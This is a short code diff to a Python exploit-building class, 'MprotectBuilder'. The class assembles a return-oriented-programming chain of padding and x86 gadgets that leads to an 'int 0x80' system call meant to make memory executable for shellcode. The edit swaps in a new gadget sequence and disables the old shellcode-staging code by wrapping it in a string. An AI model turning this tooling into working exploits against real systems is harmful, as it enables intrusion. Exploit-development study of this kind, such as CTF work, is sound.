@@ -95,7 +95,17 @@ class MprotectBuilder():
         self.DATA = self.gadget_finder.data
 
         p = b'A'*padding
-        offset = 0
+        
+        p += self.gadgets['xor eax, eax'].compile()
+        for _ in range(0, 0x5a): p += self.gadgets['inc edx'].compile()
+        for _ in range(0, 1): p += self.gadgets['add ecx, ecx'].compile()
+
+        for __ in range(0, 5): p += self.gadgets['inc edx'].compile()
+
+        for _ in range(0, 0x7d): p += self.gadgets['inc eax'].compile()
+        
+        
+        '''offset = 0
 
         p = self.build_stack_bytes(p, shellcode, offset)
         offset += len(shellcode) + 1
@@ -116,7 +126,7 @@ class MprotectBuilder():
         for _ in range(0, 0x7d): p += self.gadgets['inc eax'].compile()
 
         p += self.gadgets['int 0x80'].compile()
-        p += pack('<I', self.DATA)
+        p += pack('<I', self.DATA)'''
         self.chain = p
 
         formatted_bytes = ' '.join([str(hex(int.from_bytes(self.chain[i:i+4], "little"))) for i in range(0, len(self.chain), 4)])
